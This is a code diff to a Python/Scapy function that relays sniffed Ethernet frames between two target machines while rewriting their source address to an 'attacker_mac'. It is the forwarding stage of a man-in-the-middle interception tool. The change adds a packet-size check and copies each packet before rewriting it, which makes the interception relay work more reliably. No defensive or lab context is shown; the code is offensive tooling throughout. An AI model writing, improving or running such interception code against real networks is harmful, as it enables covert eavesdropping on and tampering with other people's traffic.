@@ -67,16 +67,26 @@ def _bridge_loop(mac_a: str, mac_b: str, attacker_mac: str, iface: str) -> None:
     """
     print("[i] Forwarding traffic between targets (Ctrl+C to stop)...")
 
+    mtu = 1500
+
     def forward(pkt):
         if not pkt.haslayer(Ether):
+            return
+        if len(pkt) > mtu:
             return
         eth = pkt[Ether]
         if eth.dst != attacker_mac:
             return
         if eth.src == mac_a:
-            sendp(Ether(src=attacker_mac, dst=mac_b) / pkt.payload, iface=iface, verbose=False)
+            pkt = pkt.copy()
+            pkt[Ether].src = attacker_mac
+            pkt[Ether].dst = mac_b
+            sendp(pkt, iface=iface, verbose=False)
         elif eth.src == mac_b:
-            sendp(Ether(src=attacker_mac, dst=mac_a) / pkt.payload, iface=iface, verbose=False)
+            pkt = pkt.copy()
+            pkt[Ether].src = attacker_mac
+            pkt[Ether].dst = mac_a
+            sendp(pkt, iface=iface, verbose=False)
 
     sniff(iface=iface, prn=forward, store=False)
 
